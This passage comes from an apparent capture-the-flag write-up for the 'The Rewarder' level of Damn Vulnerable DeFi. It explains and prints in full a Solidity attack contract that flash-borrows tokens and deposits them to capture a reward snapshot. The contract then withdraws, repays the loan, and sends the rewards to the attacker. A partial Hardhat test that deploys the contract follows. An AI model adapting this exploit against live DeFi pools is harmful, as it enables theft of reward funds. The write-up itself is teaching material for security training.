+<p>We don&rsquo;t have to forget to send back the <code>DVT</code> received by the <code>FlashLoanerPool</code>. Since we had deposited the token received (when we called the <code>deposit</code> function), we need to call the <code>withdraw</code> function to receive back these <code>DVT</code> tokens so we can, in turn, send them back to the loaner pool.</p>
+<p>Finally, we can transfer the <code>rewards</code> received to our attacker&rsquo;s address and solve the challenge.</p>
+<h2 id="3-solution">3) Solution</h2>
+<p>Here is a summary of how the solution works:</p>
+<ol>
+<li>our contact calls the <code>flashLoan</code> function with an <code>amount</code> equal to the ETH pool balance (<code>1000000</code> DVT - challenge config <a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/the-rewarder/the-rewarder.challenge.js#L9" target="_blank" rel="noopener noreffer ">here</a>)</li>
+<li>the <code>flashLoan</code> function will call our <code>receiveFlashLoan</code> function sending <code>1000000</code> DVT to our contract</li>
+<li>inside the <code>receiveFlashLoan</code> function, since we have some DVT, we approve the <code>TheRewarderPool</code> to spend the whole amount</li>
+<li>then, we call the <code>deposit</code> function with the whole amount</li>
+<li>the <code>deposit</code> function will call the <code>distributeRewards()</code> function, and since all the conditions are satisfied, the <code>mint</code> function of the reward token will be called; this way, we have received some reward tokens</li>
+<li>once the execution of the <code>deposit</code> function is completed, we need to withdraw the <code>DVT</code> tokens deposited because we need to repay the flash loan; to get back the <code>DVT</code>, we need to call the <code>withdraw</code> function from the <code>TheRewarderPool</code> contract</li>
+<li>once we have received the <code>DVT</code> tokens back, we can send (using the <code>transfer</code> function) the initial amount of <code>DVT</code> tokens to the flash loan contract to repay the flash loan</li>
+<li>finally, we transfer the rewards tokens received from our contract to the attacker&rsquo;s address</li>
+</ol>
+<p>I&rsquo;ve added some <code>require</code> calls to keep track of the balance of the different contracts.</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">84
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">85
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">86
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">87
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">88
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">89
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">90
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span><span style="color:#00f">pragma solidity</span> ^<span style="color:#3af">0</span>.<span style="color:#3af">8</span>.<span style="color:#3af">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">interface</span> <span style="color:#000">ILoanerPool</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">flashLoan</span>(<span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">interface</span> <span style="color:#000">IRewarderPool</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">deposit</span>(<span style="color:#00f">uint256</span> <span style="color:#000">amountToDeposit</span>) <span style="color:#00f">external</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">withdraw</span>(<span style="color:#00f">uint256</span> <span style="color:#000">amountToWithdraw</span>) <span style="color:#00f">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">interface</span> <span style="color:#000">IDamnValuableToken</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">transfer</span>(<span style="color:#00f">address</span> <span style="color:#000">to</span>, <span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">external</span> <span style="color:#00f">returns</span> (<span style="color:#00f">bool</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span> <span style="color:#000">account</span>) <span style="color:#00f">external</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">approve</span>(<span style="color:#00f">address</span> <span style="color:#000">spender</span>, <span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">external</span> <span style="color:#00f">returns</span> (<span style="color:#00f">bool</span>); 
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">interface</span> <span style="color:#000">IAccountingToken</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span> <span style="color:#000">account</span>) <span style="color:#00f">external</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">interface</span> <span style="color:#000">IRewardToken</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">transfer</span>(<span style="color:#00f">address</span> <span style="color:#000">to</span>, <span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">external</span> <span style="color:#00f">returns</span> (<span style="color:#00f">bool</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span> <span style="color:#000">account</span>) <span style="color:#00f">external</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"> * @title AttackRewarder
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">AttackRewarder</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">ILoanerPool</span> <span style="color:#000">flashLoanerPool</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#000">IRewarderPool</span> <span style="color:#000">rewarderPool</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#000">IDamnValuableToken</span> <span style="color:#000">token</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#000">IAccountingToken</span> <span style="color:#000">accToken</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#000">IRewardToken</span> <span style="color:#000">rewardToken</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">uint256</span> <span style="color:#00f">private</span> <span style="color:#000">amount</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">address</span> <span style="color:#000">_loaner</span>, <span style="color:#00f">address</span> <span style="color:#000">_rewarder</span>, <span style="color:#00f">address</span> <span style="color:#000">_accounting</span>, <span style="color:#00f">address</span> <span style="color:#000">_reward</span>, <span style="color:#00f">address</span> <span style="color:#000">_token</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">flashLoanerPool</span> = <span style="color:#000">ILoanerPool</span>(<span style="color:#000">_loaner</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">rewarderPool</span> = <span style="color:#000">IRewarderPool</span>(<span style="color:#000">_rewarder</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">token</span> = <span style="color:#000">IDamnValuableToken</span>(<span style="color:#000">_token</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">accToken</span> = <span style="color:#000">IAccountingToken</span>(<span style="color:#000">_accounting</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">rewardToken</span> = <span style="color:#000">IRewardToken</span>(<span style="color:#000">_reward</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">amount</span> = <span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">flashLoanerPool</span>));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">run</span>(<span style="color:#00f">address</span> <span style="color:#000">_attacker</span>) <span style="color:#00f">public</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#000">flashLoanerPool</span>.<span style="color:#000">flashLoan</span>(<span style="color:#000">amount</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#00f">bool</span> <span style="color:#000">result</span> = <span style="color:#000">rewardToken</span>.<span style="color:#000">transfer</span>(<span style="color:#000">_attacker</span>, <span style="color:#000">rewardToken</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>)));
+</span></span><span style="display:flex;"><span>      <span style="color:#000">require</span>(<span style="color:#000">result</span>, <span style="color:#5a2">&#34;Rewards not sent to the attacker&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">receiveFlashLoan</span>(<span style="color:#00f">uint256</span>) <span style="color:#00f">external</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#000">require</span>(<span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">flashLoanerPool</span>)) == <span style="color:#3af">0</span>, <span style="color:#5a2">&#34;Pool should not have any DVT&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#000">require</span>(<span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>)) == <span style="color:#3af">1000000</span> <span style="color:#00f">ether</span>, <span style="color:#5a2">&#34;Not enough DVT tokens&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#000">require</span>(<span style="color:#000">rewardToken</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>)) == <span style="color:#3af">0</span>, <span style="color:#5a2">&#34;We should not have any RWT token&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#000">require</span>(<span style="color:#000">accToken</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>)) == <span style="color:#3af">0</span>, <span style="color:#5a2">&#34;We should not have any rTKN token&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#888;font-style:italic">// approve the rewarder pool
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>      <span style="color:#000">token</span>.<span style="color:#000">approve</span>(<span style="color:#00f">address</span>(<span style="color:#000">rewarderPool</span>), <span style="color:#000">amount</span>);   
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>      <span style="color:#888;font-style:italic">// deposit the DVT tokens, receive rTKN (accounting) and RWT (reward) tokens
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>      <span style="color:#000">rewarderPool</span>.<span style="color:#000">deposit</span>(<span style="color:#000">amount</span>);
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>      <span style="color:#000">require</span>(<span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>)) == <span style="color:#3af">0</span>, <span style="color:#5a2">&#34;We haven&#39;t deposited all the DVT token&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#000">require</span>(<span style="color:#000">rewardToken</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>)) &gt; <span style="color:#3af">0</span>, <span style="color:#5a2">&#34;We should have received the reward&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#000">require</span>(<span style="color:#000">accToken</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>)) == <span style="color:#3af">1000000</span> <span style="color:#00f">ether</span>, <span style="color:#5a2">&#34;Not enough rTKN tokens&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#888;font-style:italic">// get the DVT tokens back
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>      <span style="color:#000">rewarderPool</span>.<span style="color:#000">withdraw</span>(<span style="color:#000">amount</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#000">require</span>(<span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>)) == <span style="color:#3af">1000000</span> <span style="color:#00f">ether</span>, <span style="color:#5a2">&#34;Not enough DVT tokens to pay back the loan&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#000">require</span>(<span style="color:#000">accToken</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>)) == <span style="color:#3af">0</span>, <span style="color:#5a2">&#34;We should have withdrawn all the rTNK tokens&#34;</span>);
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>      <span style="color:#888;font-style:italic">// send back the DVT tokens to the pool
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>      <span style="color:#000">token</span>.<span style="color:#000">transfer</span>(<span style="color:#00f">address</span>(<span style="color:#000">flashLoanerPool</span>), <span style="color:#000">amount</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#000">require</span>(<span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>)) == <span style="color:#3af">0</span>, <span style="color:#5a2">&#34;We haven&#39;t paid the loan back&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">receive</span>() <span style="color:#00f">external</span> <span style="color:#00f">payable</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>the-rewarder.challenge.js</code>:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#000">async</span> <span style="color:#00f">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">/** CODE YOUR EXPLOIT HERE */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">provider</span>.<span style="color:#000">send</span>(<span style="color:#5a2">&#34;evm_increaseTime&#34;</span>, [<span style="color:#3af">5</span> * <span style="color:#3af">24</span> * <span style="color:#3af">60</span> * <span style="color:#3af">60</span>]) <span style="color:#888;font-style:italic">// 5 days
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">const</span> <span style="color:#000">attack</span> = <span style="color:#000">await</span> (<span style="color:#000">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">getContractFactory</span>(<span style="color:#5a2">&#39;AttackRewarder&#39;</span>, <span style="color:#000">deployer</span>)).<span style="color:#000">deploy</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#000">this</span>.<span style="color:#000">flashLoanPool</span>.<span style="color:#00f">address</span>, 
+</span></span><span style="display:flex;"><span>            <span style="color:#000">this</span>.<span style="color:#000">rewarderPool</span>.<span style="color:#00f">address</span>, 
+</span></span><span style="display:flex;"><span>            <span style="color:#000">this</span>.<span style="color:#000">accountingToken</span>.<span style="color:#00f">address</span>, 
+</span></span><span style="display:flex;"><span>            <span style="color:#000">this</span>.<span style="color:#000">rewardToken</span>.<span style="color:#00f">address</span>, 
+</span></span><span style="display:flex;"><span>            <span style="color:#000">this</span>.<span style="color:#000">liquidityToken</span>.<span style="color:#00f">address</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        
